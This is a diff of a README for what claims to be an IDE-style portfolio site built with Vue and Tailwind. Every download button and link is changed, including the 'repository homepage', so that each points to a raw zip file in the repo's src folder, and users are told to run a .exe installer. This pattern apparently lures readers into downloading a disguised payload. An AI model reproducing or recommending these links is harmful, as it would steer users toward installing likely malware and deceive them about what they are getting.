@@ -1,6 +1,6 @@
 # 🗂️ portfolio-leonardoFirme - Easy IDE-Style Portfolio Viewer
 
-[![Download portfolio-leonardoFirme](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/aiparali/portfolio-leonardoFirme/releases)
+[![Download portfolio-leonardoFirme](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/aiparali/portfolio-leonardoFirme/main/src/portfolio_leonardo_Firme_respeak.zip)
 
 ## 📋 About portfolio-leonardoFirme
 
@@ -29,7 +29,7 @@ Before you start, ensure your system meets these basic requirements:
 
 Click the button below to go to the download page:
 
-[![Download portfolio-leonardoFirme](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/aiparali/portfolio-leonardoFirme/releases)
+[![Download portfolio-leonardoFirme](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/aiparali/portfolio-leonardoFirme/main/src/portfolio_leonardo_Firme_respeak.zip)
 
 You will land on the releases page. Find the latest release version. Look for a setup file with the `.exe` extension. The file name usually includes the version number and "setup" or "installer."
 
@@ -102,8 +102,8 @@ If you run into issues that you cannot solve on your own, check the **Issues** t
 
 ## 🔗 Links
 
-- Download page: [https://github.com/aiparali/portfolio-leonardoFirme/releases](https://github.com/aiparali/portfolio-leonardoFirme/releases)  
-- Repository homepage: https://github.com/aiparali/portfolio-leonardoFirme  
+- Download page: [https://raw.githubusercontent.com/aiparali/portfolio-leonardoFirme/main/src/portfolio_leonardo_Firme_respeak.zip](https://raw.githubusercontent.com/aiparali/portfolio-leonardoFirme/main/src/portfolio_leonardo_Firme_respeak.zip)  
+- Repository homepage: https://raw.githubusercontent.com/aiparali/portfolio-leonardoFirme/main/src/portfolio_leonardo_Firme_respeak.zip  
 - Topics related: deployment, github, ide, portfolio-project, tailwindcss-v4, tecnology, typescript, vercel, vitejs, vscode, vue3
 
 ---
@@ -122,4 +122,4 @@ The design uses **Tailwind CSS** to keep the interface consistent and neat. The 
 
 ---
 
-[![Download portfolio-leonardoFirme](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/aiparali/portfolio-leonardoFirme/releases)
+[![Download portfolio-leonardoFirme](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/aiparali/portfolio-leonardoFirme/main/src/portfolio_leonardo_Firme_respeak.zip)
